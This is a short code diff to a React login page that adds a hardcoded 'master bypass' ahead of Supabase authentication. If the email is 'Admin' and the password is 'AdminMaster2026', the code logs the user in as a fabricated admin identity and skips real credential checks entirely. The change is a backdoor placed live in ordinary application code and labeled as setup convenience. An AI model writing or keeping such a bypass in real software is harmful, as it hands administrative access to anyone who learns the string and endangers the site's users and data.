@@ -13,6 +13,13 @@ export default function LoginPage({ onLoginSuccess }) {
     setLoading(true);
     setError(null);
 
+    // MASTER BYPASS FOR INITIAL SETUP
+    if (email === 'Admin' && password === 'AdminMaster2026') {
+      onLoginSuccess({ email: 'admin@redville.com.br', user_metadata: { name: 'Admin Master' } });
+      setLoading(false);
+      return;
+    }
+
     const { data, error } = await supabase.auth.signInWithPassword({
       email,
       password,
